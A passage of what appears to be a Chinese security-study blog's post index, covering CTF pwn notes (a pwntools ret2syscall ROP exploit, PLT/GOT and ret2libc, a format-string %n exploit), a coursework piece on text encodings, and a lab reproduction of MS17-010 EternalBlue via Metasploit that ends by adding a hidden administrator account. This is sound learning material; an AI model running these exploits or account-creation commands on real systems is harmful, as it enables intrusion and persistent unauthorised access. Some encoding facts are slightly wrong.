class="keyword">for</span> gadget addresses</span><br><span class="line">  --ropchain            Enable the ROP chain generation</span><br><span class="line">  --thumb               Use the thumb mode <span class="keyword">for</span> the search engine (ARM only)</span><br><span class="line">  --console             Use an interactive console <span class="keyword">for</span> search engine</span><br><span class="line">  --norop               Disable ROP search engine</span><br><span class="line">  --nojop               Disable JOP search engine</span><br><span class="line">  --callPreceded        Only show gadgets which are call-preceded</span><br><span class="line">  --nosys               Disable SYS search engine</span><br><span class="line">  --multibr             Enable multiple branch gadgets</span><br><span class="line">  --all                 Disables the removal of duplicate gadgets</span><br><span class="line">  --noinstr             Disable the gadget instructions console printing</span><br><span class="line">  --dump                Outputs the gadget bytes</span><br><span class="line">  --silent              Disables printing of gadgets during analysis</span><br></pre></td></tr></table></figure>



<h3 id="简单的例子-1"><a href="#简单的例子-1" class="headerlink" title="简单的例子"></a>简单的例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/posts/c68c5dc4/image-20201104162146702.png" alt="image-20201104162146702"></p>
<p><img src="/posts/c68c5dc4/image-20201104162430363.png" alt="image-20201104162430363"></p>
<p><img src="/posts/c68c5dc4/image-20201104162507306.png" alt="image-20201104162507306"></p>
<p><img src="/posts/c68c5dc4/image-20201104162857614.png" alt="image-20201104162857614"></p>
<p>思路就是通过一系列gadgets，改变寄存器的参数然后再将rip指向int 0x80执行系统调用。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的ida显示的偏移不准确，需要用gdb调试<img src="/posts/c68c5dc4/image-20201104163900844.png" alt="image-20201104163900844"></p>
<p>同时,注意参数的入栈顺序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh</span><br></pre></td></tr></table></figure>

<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="PLT与GOT"><a href="#PLT与GOT" class="headerlink" title="PLT与GOT"></a>PLT与GOT</h4><p>PLT表(Procedure Linkage Table)过程连接表,在程序中以 .plt 节表示，该表处于代码段，每一个表项表示了一个与要重定位的函数相关的若干条指令，每个表项长度为 16 个字节，存储的是用于做延迟绑定的代码。调用一个外部函数的时候，会先去PLT中找，如果是非首次调用，就会直接跳转到相应的GOT表的表项，执行动态链接库里对应的函数。如果是首次，真正的函数地址会先被解析并填入相应的 GOT 表项，然后调用。</p>
<p>GOT表(Global Offset Table)全局偏移表，在程序中以 .got.plt 表示，该表处于数据段，每一个表项存储的都是一个地址，每个表项长度是当前程序的对应需要寻址长度（32位程序：4字节，64位程序：8字节）。</p>
<h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>为了方便实验,将所有的保护都关掉.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 plt\&amp;got.c -g -z execstack -fno-stack-protector -no-pie -z norelro -o plt</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c68c5dc4/image-20201104173407071.png" alt="image-20201104173407071"></p>
<p>首次调用puts函数时,首先跳转到puts函数在got.plt中记录位置</p>
<p><img src="/posts/c68c5dc4/image-20201105113447389.png" alt="image-20201105113447389"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">jmp   dword ptr [_GLOBAL_OFFSET_TABLE_+12]即跳转到内存0x8049724中低32位即0x80482c6.</span><br></pre></td></tr></table></figure>

<p><img src="/posts/c68c5dc4/image-20201105113807853.png" alt="image-20201105113807853"></p>
<p><img src="/posts/c68c5dc4/image-20201105114209230.png" alt="image-20201105114209230"></p>
<p>之后,跳转到.plt段首PLT0.解析puts的实际地址.</p>
<p><img src="/posts/c68c5dc4/image-20201105114436758.png" alt="image-20201105114436758"></p>
<p>解析完成后,将真实地址填入到got表项中并执行.</p>
<p><img src="/posts/c68c5dc4/image-20201105114919183.png" alt="image-20201105114919183"></p>
<p>第二次调用</p>
<p><img src="/posts/c68c5dc4/image-20201105115211598.png" alt="image-20201105115211598"></p>
<p>直接自 .got.plt 跳转到 puts 的真实地址,没有了第一次的解析地址过程.</p>
<ul>
<li><p>GOT 表位于.got 和.got.plt Ssection</p>
<ul>
<li>.got Section 存放外部全局变量的 GOT 表，非延迟绑定</li>
<li>.got.plt Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定.    </li>
</ul>
<table>
<thead>
<tr>
<th align="center">.got.plt(解析前)</th>
<th align="center">.got.plt(解析后)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.dynamic section 地址</td>
<td align="center">.dynamic section 地址</td>
</tr>
<tr>
<td align="center">link_map 地址</td>
<td align="center">link_map 地址</td>
</tr>
<tr>
<td align="center">_dl_runtime_resolve</td>
<td align="center">_dl_runtime_resolve</td>
</tr>
<tr>
<td align="center">puts@plt + 6</td>
<td align="center">puts</td>
</tr>
</tbody></table>
</li>
<li><p>.got.plt 前三项有特殊含义，从第四项开始保存引用的各个外部函数的 GOT 表项：</p>
<ul>
<li>第一项保存的是.dynamic section 的地址 (为动态链接提供信息，例如符号表、字符串表等)</li>
<li>第二项保存的是 link_map 结构地址 (链表，包含所有加载的共享库信息)</li>
<li>第三项保存了_dl_runtime_resolve 函数的地址 (用于解析外部函数符号的函数，解析完成后会直接执行该函数)</li>
</ul>
</li>
</ul>
<h4 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>基本的原理就是通过plt调用各种函数.在没有shellcode可写,程序中没有后门函数时可以通过已有的plt去调用动态连接库里的其他函数,如system(“/bin/sh”);可以修改got表项内容,如puts,下次调用puts的时候就会执行修改后的函数.</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串</title>
    <url>/posts/7fabda03/</url>
    <content><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在printf函数中，format字符串中有的参数，如果没有给出会自动访问在format之后的内存作为参数。</p>
<h3 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%s\n&quot;</span>,s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new format:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入调试，首先可以看到正常的printf函数调用：</p>
<a id="more"></a>

<p><img src="/posts/7fabda03/image-20201113225150355.png" alt="image-20201113225150355"></p>
<p>可以看到，对于format，实际上在是存在栈上其偏移6的父函数栈帧上的即格式化字符串的偏移为6。与正常的函数调用时的参数关系一致。</p>
<p><img src="/posts/7fabda03/IMG_0044.PNG" alt="IMG_0044"></p>
<p>如果是缺少相应的参数，printf函数会从偏移1开始匹配参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x</span><br></pre></td></tr></table></figure>

<p><img src="/posts/7fabda03/image-20201113230619688.png" alt="image-20201113230619688"></p>
<p><img src="/posts/7fabda03/image-20201113230645900.png" alt="image-20201113230645900"></p>
<p><strong>这样的方法可以用来寻找格式化字符串的偏移量</strong></p>
<p><strong>上述实验是32位，和64位中区别在于，64位优先将参数传入6个寄存器中。</strong></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>灵活使用格式化字符串的格式字符，可以做到任意地址的读写。</p>
<p>常用到的有：</p>
<ul>
<li>%x 将参数作为无符号以十六进制表示的整数打印</li>
<li>%p 打印地址</li>
<li>%s 将参数作为字符串地址，打印相应字符串（如果参数指向的不是一个字符串会造成程序崩溃）</li>
<li>%n 将参数作为地址，修改相应地址的内容。用于任意地址的写。</li>
</ul>
<p><strong>pwntools中有fmtstr_payload可以方便的构造任意地址写的payload</strong></p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在对任意地址写的时候，如果地址较低，\x00会造成格式化字符串的截断，无法达到预期效果。</p>
<h4 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h4><p><img src="/posts/7fabda03/image-20201113232149244.png" alt="image-20201113232149244"></p>
<p><img src="/posts/7fabda03/image-20201113232249593.png" alt="image-20201113232249593"></p>
<p><img src="/posts/7fabda03/image-20201113232302791.png" alt="image-20201113232302791"></p>
<p>显然存在格式化字符串漏洞，只需要将bss段的变量改为非0，执行后门函数即可。</p>
<p>通过上述方法可以得到偏移为10.</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./pwn(2)&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">addr = <span class="number">0x60107c</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+<span class="string">b&quot;%11$n&quot;</span>+p64(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里将要修改的地址置后，是p64(addr)的\x00会造成截断，如果payload为<code> p64(addr)+b&#39;%10$n&#39;</code></p>
<p>格式化字符串不会读到‘%10$n’</p>
<p>因此将地址之后，填满64位的内存，将地址的偏移构造为11.将0x60107c的内容改为3，执行sh函数。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>fmtstr</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全课程作业</title>
    <url>/posts/e492a0d/</url>
    <content><![CDATA[<a id="more"></a>

<h2 id="培养方案比较"><a href="#培养方案比较" class="headerlink" title="培养方案比较"></a>培养方案比较</h2><p>培养方案的获取主要通过各高校的学院官网获得。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214090506931.png" alt="image-20201214090506931"></p>
<p>一共选取了上海交通大学、北航、浙大三所学校，各自的专业主干课程如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上交：</span><br><span class="line">计算机组成与系统结构</span><br><span class="line">软件工程</span><br><span class="line">网络信息安全概论</span><br><span class="line">信息安全的数学基础（1）</span><br><span class="line">信号与系统（B类)</span><br><span class="line">数据库原理</span><br><span class="line">编译原理（C类)</span><br><span class="line">数字信号处理（E类)计算机通信网络(A类)信息论与编码</span><br><span class="line">数字系统设计</span><br><span class="line">信息安全的数学基础（2)</span><br><span class="line">嵌入式系统原理与应用</span><br><span class="line">Windows安全原理与技术</span><br><span class="line">现代密码学</span><br><span class="line">操作系统(B类)</span><br><span class="line">lnternet安全协议与分析</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>北航：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214091223972.png" alt="image-20201214091223972"></p>
<p>浙大</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214091332209.png" alt="image-20201214091332209"></p>
<p>比较和建议：</p>
<p>与上面这些学校相比，在基础课和专业课程的设置上来说，是没有太大差别。但是，从涉及的广度、深度来说还是有所不及。</p>
<p>建议开设一些主要以介绍目前的新技术、新思想的课程用于开拓眼界、提升能力。专业课的深度要有所提高，提高实战比例。</p>
<h2 id="编码参考文档"><a href="#编码参考文档" class="headerlink" title="编码参考文档"></a>编码参考文档</h2><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p><code>Unicode</code>是一个编码方案，<code>Unicode</code>是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。<code>Unicode</code>编码共有三种具体实现，分别为<code>utf-8,utf-16,utf-32</code>.</p>
<p><code>Unicode</code>没有规定字符对应的二进制码如何存储。以汉字“汉”为例，它的<code>Unicode</code>码点是<code>0x6c49</code>，对应的二进制数是 <code>110110001001001</code>，二进制数有 <code>15 </code>位，这也就说明了它至少需要<code> 2</code> 个字节来表示。可以想象，在<code>Unicode</code>字典中往后的字符可能就需要3个字节或者4个字节，甚至更多字节来表示了。</p>
<p>为了较好的解决<code>Unicode</code>的编码问题，<code>UTF-8</code>和<code>UTF-16</code>两种当前比较流行的编码方式诞生了。当然还有一个<code>UTF-32</code>的编码方式，也就是上述那种定长编码，字符统一使用 4 个字节，虽然看似方便，但是却不如另外两种编码方式使用广泛。</p>
<h5 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h5><p><code>UTF-8</code>实现了对<code>ASCII</code>码的向后兼容，以保证<code>Unicode</code>可以被大众接受。</p>
<p><code>UTF-8</code>是目前互联网上使用最广泛的一种<code>Unicode</code>编码方式，它的最大特点就是可变长。它可以使用<code>1 - 4</code>个字节表示一个字符，根据字符的不同变换长度。编码规则如下：</p>
<ol>
<li>对于单个字节的字符，第一位设为 0，后面的 7 位对应这个字符的 Unicode 码点。因此，对于英文中的 0 - 127 号字符，与 ASCII 码完全相同。这意味着 ASCII 码那个年代的文档用 UTF-8 编码打开完全没有问题。</li>
<li>对于需要使用 N 个字节来表示的字符（N &gt; 1），第一个字节的前 N 位都设为 1，第<code>N + 1</code>位设为0，剩余的<code>N - 1</code>个字节的前两位都设位 10，剩下的二进制位则使用这个字符的 Unicode 码点来填充。</li>
</ol>
<p>编码规则如下：</p>
<table>
<thead>
<tr>
<th align="left">Unicode 十六进制码点范围</th>
<th align="left">UTF-8 二进制</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0000 0000 - 0000 007F</td>
<td align="left">0xxxxxxx</td>
</tr>
<tr>
<td align="left">0000 0080 - 0000 07FF</td>
<td align="left">110xxxxx 10xxxxxx</td>
</tr>
<tr>
<td align="left">0000 0800 - 0000 FFFF</td>
<td align="left">1110xxxx 10xxxxxx 10xxxxxx</td>
</tr>
<tr>
<td align="left">0001 0000 - 0010 FFFF</td>
<td align="left">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
</tr>
</tbody></table>
<h5 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h5><p>在了解<code>UTF-16</code>编码方式之前，先了解一下另外一个概念——**”平面”**。</p>
<p>在上面的介绍中，提到了<code>Unicode</code>是一本很厚的字典，她将全世界所有的字符定义在一个集合里。这么多的字符不是一次性定义的，而是分区定义。每个区可以存放 65536 个（$2^{16}$）字符，称为一个平面（plane）。目前，一共有 17 个（$2^{5}$）平面，也就是说，整个 Unicode 字符集的大小现在是 $2^{21}$。</p>
<p>最前面的 65536 个字符位，称为基本平面（简称 BMP ），它的码点范围是从 0 到 $2^{16}-1$，写成 16 进制就是从 U+0000 到 U+FFFF。所有最常见的字符都放在这个平面，这是 Unicode 最先定义和公布的一个平面。剩下的字符都放在辅助平面（简称 SMP ），码点范围从 U+010000 到 U+10FFFF。</p>
<p>基本了解了平面的概念后，再说回到 UTF-16。UTF-16 编码介于 UTF-32 与 UTF-8 之间，同时结合了定长和变长两种编码方法的特点。它的编码规则很简单：基本平面的字符占用 2 个字节，辅助平面的字符占用 4 个字节。也就是说，UTF-16 的编码长度要么是 2 个字节（U+0000 到 U+FFFF），要么是 4 个字节（U+010000 到 U+10FFFF）。那么问题来了，当我们遇到两个字节时，到底是把这两个字节当作一个字符还是与后面的两个字节一起当作一个字符呢？</p>
<p>这里有一个很巧妙的地方，在基本平面内，从 <strong>U+D800</strong> 到 <strong>U+DFFF</strong> 是一个空段，即这些码点不对应任何字符。因此，这个空段可以用来映射辅助平面的字符。</p>
<p>辅助平面的字符位共有 $2^{20}$ 个，因此表示这些字符至少需要 20 个二进制位。UTF-16 将这 20 个二进制位分成两半，前 10 位映射在 U+D800 到 U+DBFF，称为高位（H），后 10 位映射在 U+DC00 到 U+DFFF，称为低位（L）。这意味着，一个辅助平面的字符，被拆成两个基本平面的字符表示。</p>
<p>因此，当我们遇到两个字节，发现它的码点在 U+D800 到 U+DBFF 之间，就可以断定，紧跟在后面的两个字节的码点，应该在 U+DC00 到 U+DFFF 之间，这四个字节必须放在一起解读。</p>
<p>接下来，以汉字”𠮷”为例，说明 UTF-16 编码方式是如何工作的。</p>
<p>汉字”𠮷”的 Unicode 码点为 <code>0x20BB7</code>，该码点显然超出了基本平面的范围（0x0000 - 0xFFFF），因此需要使用四个字节表示。首先用 <code>0x20BB7 - 0x10000</code> 计算出超出的部分，然后将其用 20 个二进制位表示（不足前面补 0 ），结果为<code>0001000010 1110110111</code>。接着，将前 10 位映射到 U+D800 到 U+DBFF 之间，后 10 位映射到 U+DC00 到 U+DFFF 即可。<code>U+D800</code> 对应的二进制数为 <code>1101100000000000</code>，直接填充后面的 10 个二进制位即可，得到 <code>1101100001000010</code>，转成 16 进制数则为 <code>0xD842</code>。同理可得，低位为 <code>0xDFB7</code>。因此得出汉字”𠮷”的<code>UTF-16</code>编码为 <code>0xD842 0xDFB7</code>。</p>
<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p><code>base64</code>编码的数据转换成二进制每个字符只有<code>8</code>位，那么<code>base64</code>编码表就共有<code>2^8</code>即<code>64</code>个对应：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/2000534-f4d27b41c1297902.png"></p>
<p>下面用一个例子来说明加密的过程：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">- 首先取ABC对应的ASCII码值</span><br><span class="line">A : 65、B : 66、C : 67</span><br><span class="line">- 再取二进制值</span><br><span class="line">A : 01000001、B : 01000010、C : 01000011</span><br><span class="line">- 然后把这三个字节的二进制码接起来</span><br><span class="line">010000010100001001000011</span><br><span class="line">- 再以6位为单位分成4个数据块并在最高位填充两个0后形成4个字节的编码后的值</span><br><span class="line">00010000、00010100、00001001、00000011</span><br><span class="line">- 再把这4个字节数据转化成10进制数</span><br><span class="line">16、20、19、3</span><br><span class="line">- 最后根据Base64给出的64个基本字符表，查出对应的ASCII码字符</span><br><span class="line">Q、U、J、D</span><br><span class="line">这里的值实际就是数据在字符表中的索引。</span><br><span class="line">解码过程就是把4个字节再还原成3个字节再根据不同的数据形式把字节数组重新整理成数据。</span><br></pre></td></tr></table></figure>

<p>这样的话，<code>3</code>个普通字符就可以编码成<code>4</code>个<code>base64</code>编码后的字符，所以我们通常是以<code>4</code>个编码字符为单位的。</p>
<p>当<code>n=0 mod 3</code>时：可以完全编码成<code>base64</code>字符。</p>
<p>当<code>n=1 mod 3</code>时：第一个字符的前<code>6</code>位二进制被编码成一个<code>base64</code>字符，剩下的两位用<code>0</code>补齐之后再编码成<code>base64</code>字符。因为是以<code>4</code>个为单位，缺的用<code>=</code>补齐。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">010000 010000</span><br><span class="line">QQ==</span><br></pre></td></tr></table></figure>

<p>当<code>n=2 mod 3</code>时：共<code>8*2=16</code>位二进制，编码后剩下<code>2</code>位用<code>0</code>补齐进行编码，则就有<code>3</code>个编码字符串了。然后再用<code>=</code>凑齐<code>4</code>个。</p>
<p>解码时原理一样。</p>
<h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><p><code>ASCII</code>码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数，剩下的1位二进制为0）来表示所有的大写和小写字母，数字0 到9、标点符号，以及在美式英语中使用的特殊控制字符。</p>
<p>0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），如控制符：<code>LF</code>（换行）、<code>CR</code>、<code>FF</code>（换页）、<code>DEL</code>（删除）、<code>BS</code>（退格)、<code>BEL</code>（响铃）等；通信专用字符：<code>SOH</code>（文头）、<code>EOT</code>（文尾）、<code>ACK</code>（确认）等；ASCII值为8、9、10 和13 分别转换为退格、制表、换行和回车字符。它们并没有特定的图形显示，但会依不同的应用程序，而对文本显示有不同的影响 。</p>
<p><code>32～126</code>(共95个)是字符（32是空格），其中<code>48～57</code>为0到9十个阿拉伯数字。</p>
<p><code>65～90</code>为26个大写英文字母，<code>97～122</code>号为26个小写英文字母，其余为一些标点符号、运算符号等。</p>
<p>后<code>128</code>个称为拓展<code>ascii</code>码。许多基于<code>x86</code>的系统都支持使用扩展<code>ASCII</code>。扩展<code>ASCII</code>码允许将每个字符的第8 位用于确定附加的<code>128 </code>个特殊符号字符、外来语字母和图形符号。小写字母的<code>ASCII</code>码值比大写字母<code>ASCII</code>码值大<code>32</code>。</p>
<h3 id="url-编码"><a href="#url-编码" class="headerlink" title="url 编码"></a>url 编码</h3><p><code>URL</code>编码遵循下列规则：每对<code>name/value</code>由<code>&amp;;</code>符分开；每对来自表单的<code>name/value</code>由=符分开，如果用户没有输入值给这个<code>name</code>，那么这个<code>name</code>还是出现，只是无值。任何特殊的字符（就是那些不是简单的七位<code>ASCII</code>，如汉字）将以百分符<code>%</code>用十六进制编码，当然也包括象 <code>=,&amp;;</code>和<code>%</code>这些特殊的字符。其实<code>url</code>编码就是一个字符<code>ascii</code>码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如<code>\</code>，它的<code>ascii</code>码是<code>92</code>，<code>92</code>的十六进制是<code>5c</code>，所以<code>\</code>的<code>url</code>编码就是<code>%5c</code>。</p>
<p>简单来讲，<code>url</code>编码是<code>%</code>+<code>ascii</code>码的十六进制表示形式。目的是为了防止<code>url</code>内的特殊字符引起歧义。</p>
<h2 id="ms17-010-永恒之蓝-漏洞复现"><a href="#ms17-010-永恒之蓝-漏洞复现" class="headerlink" title="ms17-010(永恒之蓝)漏洞复现"></a>ms17-010(永恒之蓝)漏洞复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul>
<li>虚拟机环境：VMware Workstation 16 pro</li>
<li>网络模式：NAT</li>
<li>攻击机：kali Linux  IP：192.168.204.133</li>
<li>靶机：Windows 7 X64 IP：192.168.204.131</li>
</ul>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>通过nmap对192.168.204.0/24 这个网段扫描发现是否有存在ms17-010漏洞的主机。</p>
<ol>
<li>找到nmap关于ms17-010的扫描脚本</li>
</ol>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210215527241.png" alt="image-20201210215527241"></p>
<p>指令说明：</p>
<ul>
<li>whereis 用于查找文件</li>
<li>locate 用于查找符合条件的文档，这里就是查找包含ms17-010的文件的路径</li>
</ul>
<ol start="2">
<li>使用脚本扫描整个网段</li>
</ol>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210220203102.png" alt="image-20201210220203102"></p>
<p>找到了有ms17-010漏洞的主机，也就是设定的靶机。</p>
<h4 id="使用Metasploit进行攻击（渗透攻击阶段）"><a href="#使用Metasploit进行攻击（渗透攻击阶段）" class="headerlink" title="使用Metasploit进行攻击（渗透攻击阶段）"></a>使用Metasploit进行攻击（渗透攻击阶段）</h4><ol>
<li><p>进入msf框架，找到ms17-010攻击模块。</p>
<p>1.1 输入<code>msfconsole</code>启动Metasploit</p>
</li>
</ol>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210220714731.png" alt="image-20201210220714731"></p>
<p>​    1.2 输入<code>search ms17-010</code>查找永恒之蓝漏洞</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221132117.png" alt="image-20201210221132117"></p>
<p>可以看到有5个模块，其中auxiliary/scanner/smb/smb_ms17_010是扫描MS17-010永恒之蓝的模块，扫描或者说检查目标主机是否存在MS17-010永恒之蓝的漏洞（上文已使用nmap进行扫描）。exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码的模块.</p>
<ol start="2">
<li><p>使用ms17-010攻击模块，对靶机Win7进行攻击</p>
<p>1.1 输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>，进入攻击模块</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221416159.png" alt="image-20201210221416159"></p>
<p>1.2输入<code>options</code> 查看需要设置的内容<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221535375.png" alt="image-20201210221535375"></p>
<p>1.3设置目标主机的IP<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221905461.png" alt="image-20201210221905461"></p>
<p>1.4设置payload（攻击载荷）<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210222413306.png" alt="image-20201210222413306"></p>
<p>选择与目标主机建立反向连接，输入<code>run</code>开始攻击。</p>
<p>成功后，输入shell。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230012261.png" alt="image-20201210230012261"></p>
<p>这里出现错误，上网查找后升级更新解决问题。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230156170.png" alt="image-20201210230156170"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230115985.png" alt="image-20201210230115985"></p>
</li>
</ol>
<h4 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h4><p>   创建一个用户并提权为管理员。</p>
<ol>
<li><p>创建用户</p>
<p>输入<code>net user test test /add</code>，创建一个名为test，密码为test的普通用户。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232006046.png" alt="image-20201210232006046"></p>
<ol start="2">
<li><p>提升权限</p>
<p>输入<code>net localgroup administrators test /add    </code>。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232719373.png" alt="image-20201210232719373"></p>
</li>
</ol>
</li>
</ol>
<pre><code>   3. 验证</code></pre>
<p>   <img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232748811.png" alt="image-20201210232748811"></p>
]]></content>
  </entry>
</search>
